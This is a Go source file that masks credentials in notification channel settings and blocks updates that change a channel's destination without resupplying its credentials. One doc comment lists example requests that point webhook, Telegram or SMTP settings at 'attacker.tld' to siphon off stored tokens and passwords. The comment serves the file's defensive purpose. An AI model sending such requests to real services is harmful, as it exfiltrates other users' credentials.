package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes
// credentials it replaces the real content with a value carrying this prefix; the
// update endpoint reads a value with this prefix as "keep the stored value
// unchanged".
//
// A prefix rather than an empty string or some fixed constant is used so it can
// also carry a little identifying information (see MaskedValue), letting the user
// tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original too short, no hint given
//	"__masked__:…ab12cd"      last 6 chars of the original as an identifying hint
//
// Exposing only the last 6 characters is deliberate: a webhook address's
// identifying information is at the tail (e.g. WeCom's key, Feishu's bot id),
// while the prefix is identical across bots and has no identifying value. The last
// 6 characters are not enough to reconstruct the credential, but enough for the
// configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified after the
// API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config -
// better for the UI to show "config unavailable" than to spit back the whole
// possibly credential-bearing content when the channel type cannot be recognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole:
		// judging each sub-key would require every channel to declare another "which
		// sub-keys are credentials" rule, complexity far outweighing the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed,
// but the caller did not declare the credential fields". It is returned instead of
// silently allowing through or silently dropping credentials; see
// PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // changed destination keys
	Missing []string // credential keys not explicitly declared
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also refill the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter new values, or leave them explicitly empty to indicate credentials are no longer needed. " +
		"The original credentials are only valid for the old address; reusing them is equivalent to handing them to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive
// "destination address change" case.
//
// It replaces bare MergeConfig on the channel update path, addressing a
// demonstrated-feasible path: the destination address (where messages go) and the
// credentials (what identity they use) are two independent field sets, and
// MergeConfig always keeps the stored value for "unmentioned keys". So anyone able
// to PATCH a channel simply by **changing only the address and staying silent
// about the credentials** can make the server send the real stored credentials to
// an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> hands over username and password after STARTTLS
//
// This path is completely silent and does not rely on redirects (so rejecting
// cross-host redirects does not stop it), and it directly defeats this package's
// masking goal - "credentials are not echoed back to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must
// explicitly declare **every** credential key:
//   - give a new value -> use the new value
//   - pass an explicit empty string -> the field no longer needs credentials (the
//     clear semantics are preserved)
//   - echo back the masked value as-is / simply omit the key -> reject
//
// The third is rejected too because a "masked value" means exactly "reuse the old
// credential", and the old credential is only valid for the old address. "Auto-
// drop credentials" is deliberately not done here - for optional credential
// fields (webhook's headers, email's password) it would silently become
// "authentication is gone but the endpoint returns 200", harder to diagnose than
// an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers, an object) has the
	// mask literal embedded, the caller has smuggled the "keep original" sentinel
	// inside a struct. MergeConfig only recognizes a "string with the prefix" as a
	// mask, so this shape would be stored as an ordinary object as-is - the literal
	// "__masked__" would really land in the database, silently breaking later auth
	// with no error at all. Better to reject.
	//
	// This check must come **first**: when the address is unchanged it takes an
	// early return, so placing it later would cover only the "address changed" path
	// (the first version got this placement wrong, and the tests caught it outright).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys actually changed. A masked value equals "not
	// changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged, take ordinary merge (masked value keeps the original,
		// empty string clears, the rest overrides).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit declaration for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting the mask sentinel inside a
// non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field
// like webhook's headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q inside its content: this field must either be left entirely empty to keep using it, or submitted entirely with a new value; a mask placeholder cannot be smuggled inside a struct",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization
// is used to also handle type differences - the port the frontend submits is a
// number, while what is read back from the database is a float64, so a direct ==
// would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "key absent"
// are the same state in this config model, because MergeConfig treats an empty
// string as an explicit clear and deletes the key outright. Without normalization,
// an always-blank optional destination field (Telegram's base_url is the only such
// field: blank means use the official address) would take this path -
//
//	stored base_url:"" on creation  ->  MergeConfig deletes the key on the first save
//	-> on the next save incoming is "" and stored lacks the key, judged as "address changed"
//	-> credentials are masked -> 400 "destination address has changed; please also refill the credential fields"
//
// After that every save fails unless the user re-pastes the Bot Token, when they
// changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank". The criterion must
// match MergeConfig's clear check (strings.TrimSpace(s) == ""), or a gap would
// appear where "MergeConfig thinks it should be deleted, sameConfigValue thinks it
// has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming over stored, used to update channel config.
//
// Rules:
//   - keys whose incoming value is masked -> keep stored's original value (the
//     user did not change this field)
//   - keys whose incoming value is an empty string -> treated as an explicit
//     clear, the key is deleted
//   - other keys -> overridden by incoming's value
//   - keys present in stored but not in incoming -> kept (partial-update semantics)
//
// Whether an empty string counts as a "clear" must be pinned down: the frontend
// form submits unfilled fields as empty strings, and treating them as valid values
// would really clear fields meant as "leave blank to keep the original". Explicit
// clearing is chosen here, because to remove a mis-set field the user has no other
// way to express it (dragging a field away could distinguish "not provided" from
// "provided empty", but the UI does not need that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
